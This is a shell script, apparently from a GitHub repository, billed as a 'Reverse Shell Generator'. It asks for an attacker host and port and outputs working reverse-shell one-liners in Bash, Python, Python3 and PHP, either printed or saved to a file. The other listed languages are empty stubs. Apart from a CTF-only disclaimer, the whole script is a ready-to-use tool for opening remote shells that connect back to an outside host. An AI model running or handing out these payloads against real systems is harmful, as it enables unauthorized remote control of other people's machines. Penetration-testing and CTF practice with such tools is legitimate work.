#!/bin/sh

echo "########## Created by 0xpr0N3rd (GitHub) ##########\n\n"
# Cheat sheets of PentestMoney and Highon.Coffe are used in this script. 

echo "DISCLAIMER: This tool is developed only for legal purposes, such as CTFs. Developer does not take any responsibility in any kind of illegal usage.\n\n" 
echo "##### Reverse Shell Generator v1.0 #####\n\n"

echo "Select the shell type you want to generate. Here are the types currently supported:"
echo "\n### Bash, Python/3, PHP, Perl, Ruby, Netcat, Java, XTerm, Telnet, Gawk ###"

generateShell () {
	echo "\nJust select one of them and let the magic happen: "; read type
	
	dqt='"' # double quotation char
	dsg='$' # dollar sign char

	case $type in
		bash | BASH | bASH | Bash) 		# check if it's Bash
		echo "\nAlright, you have selected Bash."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
		
		case $answer in
			text | TEXT)
			echo "\nThere you go buddy:"
			echo "\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"			
			;;
			
			file | FILE)
			echo "Enter output file name: (without '.sh')"; read outputName
			echo "\nThere you go buddy, your file is saved as "$outputName.sh" in your current directory."
			echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > $outputName.sh
			echo "\nCurrent directory: $PWD" 
			eval ls -la $outputName.sh
			echo "\nContent of $outputName.sh:"
			eval cat $outputName.sh
			;;
		esac
		;;
		
		python | PYTHON | pYTHON | Python) 	# check if it's Python
		echo "\nAlright, you have selected Python."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
		
		case $answer in
			text | TEXT)
			echo "\nThere you go buddy:"
			echo "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'"			
			;;
			
			file | FILE)
			echo "Enter output file name: (without '.py')"; read outputName
			echo "\nThere you go buddy, your file is saved as "$outputName.py" in your current directory."
			echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'" > $outputName.py
			echo "\nCurrent directory: $PWD" 
			eval ls -la $outputName.py
			echo "\nContent of $outputName.py:"
			eval cat $outputName.py
			;;
		esac
		
		;;
		
		python3 | PYTHON3 | pYTHON3 | Python3) 	# check if it's Python3
		echo "\nAlright, you have selected Python3."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
		
		case $answer in
			text | TEXT)
			echo "\nThere you go buddy:"
			echo "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'"			
			;;
			
			file | FILE)
			echo "Enter output file name: (without '.py')"; read outputName
			echo "\nThere you go buddy, your file is saved as "$outputName.py" in your current directory."
			echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'" > $outputName.py
			echo "\nCurrent directory: $PWD" 
			eval ls -la $outputName.py
			echo "\nContent of $outputName.py:"
			eval cat $outputName.py
			;;
		esac
		;;
		
		php | PHP | pHP | Php)			# check if it's PHP
		echo "\nAlright, you have selected PHP."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
		
		case $answer in
			text | TEXT)
			echo "\nThere you go buddy:"
			echo "\nphp -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'"			
			;;
			
			file | FILE)
			echo "Enter output file name: (without '.php')"; read outputName
			echo "\nThere you go buddy, your file is saved as "$outputName.php" in your current directory."
			echo "php -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'" > $outputName.php
			echo "\nCurrent directory: $PWD" 
			eval ls -la $outputName.php
			echo "\nContent of $outputName.php:"
			eval cat $outputName.php
			;;
		esac
		;;
		
		perl | PERL | pERL | Perl)		# check if it's Perl
		echo "You have selected Perl!"
		;;
		
		ruby | RUBY | rUBY | Ruby)		# check if it's Ruby
		echo "You have selected Ruby!"
		;;
		
		netcat | NETCAT | nETCAT | Netcat)	# check if it's Netcat
		echo "You have selected Netcat!"
		;;
		
		java | JAVA | jAVA | Java)		# check if it's Java
		echo "You have selected Java!"
		;;
		
		xterm | XTERM | xTERM | Xterm)		# check if it's XTerm
		echo "You have selected xterm!"
		;;
		
		telnet | TELNET | tELNET | Telnet)	# check if it's Telnet
		echo "You have selected Telnet!"
		;;
		
		gawk | GAWK | gAWK | Gawk)		# check if it's Gawk
		echo "You have selected Gawk!"
		;;
		
		*)
		echo "Woops! I guess you meant to write something else. Are you sure you want to select that one? (y/N):"; read decision
		
		case $decision in
			y | Y)
			eval clear
			echo "root@0xpr0N3rd:~# cat root.txt"
			echo "Congratz! You pwned 0xpr0N3rd!!!\n\n\n\n"
			echo "Just kidding you dummy, you have selected a wrong option."
			;;
			
			n | N)
			echo "Alright buddy, hit it again :) "
			generateShell
			;;
			
			*)
			echo "\n\nYou leave me no chance but terminating the program, sorry dude."
			echo "\n\n##### Program terminated. #####"
			exit 1
			;;
		esac
		;; 
	esac
	
	echo "\n\n\n\n\n##### Program terminated. #####"
}

generateShell
